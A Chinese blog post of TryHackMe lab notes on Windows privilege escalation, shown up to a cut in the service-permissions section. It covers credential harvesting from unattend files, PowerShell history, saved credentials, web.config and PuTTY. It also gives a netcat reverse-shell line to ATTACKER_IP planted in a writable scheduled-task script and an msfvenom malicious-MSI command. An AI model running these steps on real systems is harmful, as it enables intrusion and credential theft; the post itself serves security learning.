<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="THM-Windows权限提升, hybcx&#39;s blog">
    <meta name="description" content="0x01 前言
最近在tryhackme中学到了Windows渗透相关知识，在此之前学的有些东西忘记记录了，但实际上也没有记录的必要性，故此不管了。这里就记录Windows提权的某些知识点。
0x02 简介
简而言之，权限升级包括使用“用户">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-BYTY196ENH');
    </script>


    <title>THM-Windows权限提升 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">THM-Windows权限提升</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/TryHackMe/">
                                <span class="chip bg-color">TryHackMe</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/TryHackMe/" class="post-category">
                                TryHackMe
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-02-06
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-02-06
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    10.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    41 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 前言</h1>
<p>最近在tryhackme中学到了Windows渗透相关知识，在此之前学的有些东西忘记记录了，但实际上也没有记录的必要性，故此不管了。这里就记录Windows提权的某些知识点。</p>
<h1>0x02 简介</h1>
<p>简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用它来获得对“用户 B”的访问权限。虽然我们通常希望“用户 B”拥有管理权限，但在某些情况下，我们可能需要升级到其他非特权帐户，然后才能真正获得管理权限。</p>
<p>获得对不同帐户的访问权限就像在一些粗心的用户留下的不安全的文本文件或电子表格中查找凭据一样简单，但情况并非总是如此。根据具体情况，我们可能需要利用以下一些弱点：</p>
<ul>
<li>Windows 服务或计划任务配置错误</li>
<li>分配给我们帐户的权限过多</li>
<li>易受攻击的软件</li>
<li>缺少 Windows 安全补丁</li>
</ul>
<p>在开始讨论实际技术之前，让我们先了解一下 Windows 系统上的不同帐户类型。</p>
<h1>0x03 Windows用户</h1>
<p>Windows系统主要有两类用户。根据用户的访问级别，我们可以将用户分为以下组之一：</p>
<table>
<thead>
<tr>
<th><strong>Administrators 管理员</strong></th>
<th>这些用户拥有最多的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Standard Users 标准用户</strong></td>
<td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久或重要的更改，并且仅限于他们的文件。</td>
</tr>
</tbody>
</table>
<p>任何具有管理权限的用户都将成为管理员组的一部分。另一方面，标准用户是用户组的一部分。</p>
<p>除此之外，您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户：</p>
<table>
<thead>
<tr>
<th><strong>SYSTEM / LocalSystem 系统/本地系统</strong></th>
<th>操作系统用来执行内部任务的帐户。它可以完全访问主机上可用的所有文件和资源，并且具有比管理员更高的权限。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Local Service 本地服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td>
</tr>
<tr>
<td><strong>Network Service 网络服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td>
</tr>
</tbody>
</table>
<p>这些帐户由 Windows 创建和管理，您将无法像其他常规帐户一样使用它们。不过，在某些情况下，您可能会因为利用特定服务而获得他们的特权。</p>
<h1>0x03 Windows密码收集</h1>
<p>获得其他用户访问权限的最简单方法是从受感染的计算机收集凭据。此类凭证的存在可能有多种原因，包括粗心的用户将其留在明文文件中；甚至由浏览器或电子邮件客户端等软件存储。</p>
<h2 id="3-1-Windows-installations">3.1 Windows installations</h2>
<p>在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机。此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置：</p>
<ul>
<li>C:\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
</ul>
<p>作为这些文件的一部分，您可能会遇到凭据：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Credentials</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Username</span><span class="token punctuation">&gt;</span></span>Administrator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Username</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Domain</span><span class="token punctuation">&gt;</span></span>thm.local<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Domain</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">&gt;</span></span>MyPassword123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Credentials</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="3-2-Powershell-History">3.2 Powershell History</h2>
<p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去的命令。这对于快速重复之前使用过的命令很有用。如果用户直接在 Powershell 命令行中运行包含密码的命令，则稍后可以在 <code>cmd.exe</code> 提示符下使用以下命令来检索该密码：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">type <span class="token placeholder selector">%userprofile</span>%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注意：上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将 <code>%userprofile%</code> 识别为环境变量。要从 Powershell 读取文件，您必须将 <code>%userprofile%</code> 替换为 <code>$Env:userprofile</code> 。</p>
<h2 id="3-3-Windows-Credentials">3.3 Windows Credentials</h2>
<p>Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">cmdkey /list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>虽然您看不到实际的密码，但如果您发现任何值得尝试的凭据，则可以将它们与 <code>runas</code> 命令和 <code>/savecred</code> 选项一起使用，如下所示。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">runas /savecred /<span class="token property">user</span><span class="token punctuation">:</span>admin cmd.exe
<span class="token comment">//上述的user:admin可分别用对应的hash值替换</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="3-4-IIS-Configuration">3.4 IIS Configuration</h2>
<p>Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器。 IIS 上网站的配置存储在名为 <code>web.config</code> 的文件中，并且可以存储数据库的密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p>
<ul>
<li>C:\inetpub\wwwroot\web.config</li>
<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
</ul>
<p>这是在文件上查找数据库连接字符串的快速方法：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">type <span class="token property">C</span><span class="token punctuation">:</span>\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="3-5-从软件检索凭证：PuTTY">3.5 从软件检索凭证：PuTTY</h2>
<p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供以后使用。虽然 PuTTY 不允许用户存储其 SSH 密码，但它将存储包含明文身份验证凭据的代理配置。</p>
<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f <span class="token string">"Proxy"</span> /s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注意：Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p>
<p>正如 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、SSH 客户端、VNC 软件等，都将有方法恢复用户保存的任何密码。</p>
<h1>0x04 权限提升</h1>
<h2 id="4-1-Scheduled-Tasks-计划任务">4.1 Scheduled Tasks -计划任务</h2>
<p>查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。</p>
<p>可以使用不带任何选项的 <code>schtasks</code> 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<p>可以使用不带任何选项的 <code>schtasks</code> 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; schtasks /query /tn vulntask /fo list /v
<span class="token property">Folder</span><span class="token punctuation">:</span> \
<span class="token property">HostName</span><span class="token punctuation">:</span>                             THM-PC1
<span class="token property">TaskName</span><span class="token punctuation">:</span>                             \vulntask
Task To <span class="token property">Run</span><span class="token punctuation">:</span>                          <span class="token property">C</span><span class="token punctuation">:</span>\tasks\schtask.bat
Run <span class="token module-modifier keyword">As</span> <span class="token property">User</span><span class="token punctuation">:</span>                          taskusr1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>您将获得有关该任务的大量信息，但对我们来说重要的是“Task To Run”参数，该参数指示计划任务执行的内容，以及“Run As User”参数，该参数显示将使用的用户执行任务。</p>
<p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用 <code>icacls</code> ：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; icacls <span class="token property">c</span><span class="token punctuation">:</span>\tasks\schtask.bat
<span class="token property">c</span><span class="token punctuation">:</span>\tasks\schtask.bat NT AUTHORITY\<span class="token property">SYSTEM</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>
                    BUILTIN\<span class="token property">Administrators</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>
                    BUILTIN\<span class="token property">Users</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>从结果中可以看出，BUILTIN\Users 组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入我们喜欢的任何有效负载。为了您的方便，可以在 <code>C:\tools</code> 上找到 <code>nc64.exe</code> 。让我们更改 bat 文件以生成反向 shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; echo <span class="token property">c</span><span class="token punctuation">:</span>\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 <span class="token operator">&gt;</span> <span class="token property">C</span><span class="token punctuation">:</span>\tasks\schtask.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后，我们在攻击者机器上启动一个侦听器，该侦听器位于我们在反向 shell 上指示的同一端口上：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下次运行计划任务时，您应该会收到具有taskusr1权限的反向shell。虽然您可能无法在实际场景中启动任务，而必须等待计划任务触发（但我们为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行该任务）</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; schtasks /run /tn vulntask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>您将按预期收到具有taskusr1权限的反向shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2018 Microsoft Corporation. All rights reserved.

<span class="token property">C</span><span class="token punctuation">:</span>\Windows\system32&gt;whoami
wprivesc1\taskusr1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-2-AlwaysInstallElevated-始终安装提升">4.2 AlwaysInstallElevated -始终安装提升</h2>
<p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。</p>
<p>注意：AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。</p>
<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
<span class="token property">C</span><span class="token punctuation">:</span>\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。如果设置了这些，您可以使用 <code>msfvenom</code> 生成恶意 .msi 文件，如下所示：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>由于这是一个反向 shell，您还应该运行相应配置的 Metasploit 处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; msiexec /quiet /qn /i <span class="token property">C</span><span class="token punctuation">:</span>\Windows\Temp\malicious.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="4-3-Windows-Services">4.3 Windows Services</h2>
<p>Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p>
<p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此任何可执行文件都不能作为服务成功启动。每个服务还指定该服务将在其下运行的用户帐户。</p>
<p>为了更好地理解服务的结构，让我们使用 <code>sc qc</code> 命令检查 apphostsvc 服务配置：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

<span class="token property">SERVICE_NAME</span><span class="token punctuation">:</span> apphostsvc
        <span class="token property">TYPE</span>               <span class="token punctuation">:</span> 20  WIN32_SHARE_PROCESS
        <span class="token property">START_TYPE</span>         <span class="token punctuation">:</span> 2   AUTO_START
        <span class="token property">ERROR_CONTROL</span>      <span class="token punctuation">:</span> 1   NORMAL
        <span class="token property">BINARY_PATH_NAME</span>   <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\Windows\system32\svchost.exe -k apphost
        <span class="token property">LOAD_ORDER_GROUP</span>   <span class="token punctuation">:</span>
        <span class="token property">TAG</span>                <span class="token punctuation">:</span> 0
        <span class="token property">DISPLAY_NAME</span>       <span class="token punctuation">:</span> Application Host Helper Service
        <span class="token property">DEPENDENCIES</span>       <span class="token punctuation">:</span>
        <span class="token property">SERVICE_START_NAME</span> <span class="token punctuation">:</span> localSystem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里我们可以看到关联的可执行文件是通过 BINARY_PATH_NAME 参数指定的，用于运行服务的帐户显示在 SERVICE_START_NAME 参数上。</p>
<p>服务有一个自主访问控制列表（DACL），它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。 DACL 可以从 Process Hacker 中看到（可以在您的计算机桌面上找到）：</p>
<p><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240206103905671.png" alt="image-20240206103905671"></p>
<p>所有服务配置都存储在注册表中的 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code> 下：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206103915222.png" alt="image-20240206103915222"></p>
<p>系统中的每个服务都存在一个子项。同样，我们可以在 ImagePath 值上看到关联的可执行文件，并在 ObjectName 值上看到用于启动服务的帐户。如果已为该服务配置了 DACL，它将存储在名为 Security 的子项中。正如您现在已经猜到的，默认情况下只有管理员可以修改此类注册表项。</p>
<h2 id="4-4-服务可执行文件的不安全权限">4.4 服务可执行文件的不安全权限</h2>
<p>如果与服务关联的可执行文件的权限较弱，允许攻击者修改或替换它，则攻击者可以轻松获得该服务帐户的权限。</p>
<p>为了了解其工作原理，让我们看一下 Splinterware System Scheduler 上发现的漏洞。首先，我们将使用 <code>sc</code> 查询服务配置：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

<span class="token property">SERVICE_NAME</span><span class="token punctuation">:</span> windowsscheduler
        <span class="token property">TYPE</span>               <span class="token punctuation">:</span> 10  WIN32_OWN_PROCESS
        <span class="token property">START_TYPE</span>         <span class="token punctuation">:</span> 2   AUTO_START
        <span class="token property">ERROR_CONTROL</span>      <span class="token punctuation">:</span> 0   IGNORE
        <span class="token property">BINARY_PATH_NAME</span>   <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\PROGRA~2\SYSTEM~1\WService.exe
        <span class="token property">LOAD_ORDER_GROUP</span>   <span class="token punctuation">:</span>
        <span class="token property">TAG</span>                <span class="token punctuation">:</span> 0
        <span class="token property">DISPLAY_NAME</span>       <span class="token punctuation">:</span> System Scheduler Service
        <span class="token property">DEPENDENCIES</span>       <span class="token punctuation">:</span>
        <span class="token property">SERVICE_START_NAME</span> <span class="token punctuation">:</span> .\svcuser1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们可以看到漏洞软件安装的服务以 svcuser1 身份运行，与该服务关联的可执行文件位于 <code>C:\Progra~2\System~1\WService.exe</code> 中。然后我们继续检查可执行文件的权限：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\Users\thm-unpriv&gt;icacls <span class="token property">C</span><span class="token punctuation">:</span>\PROGRA~2\SYSTEM~1\WService.exe
